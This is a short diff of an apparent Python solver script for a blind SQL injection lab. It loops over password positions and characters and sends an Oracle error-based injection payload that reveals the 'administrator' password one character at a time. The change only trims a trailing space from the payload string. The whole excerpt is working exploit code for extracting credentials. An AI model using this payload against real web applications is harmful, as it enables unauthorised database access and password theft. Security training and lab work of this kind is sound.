@@ -64,7 +64,7 @@ for position in range(1, 21):
     for char in characters:
         guess = password + char
         payload = (
-            f"' || (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator' AND SUBSTR(password,1,{position})='{guess}') || ' "
+            f"' || (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator' AND SUBSTR(password,1,{position})='{guess}') || '"
         )
 
         response = session.get(
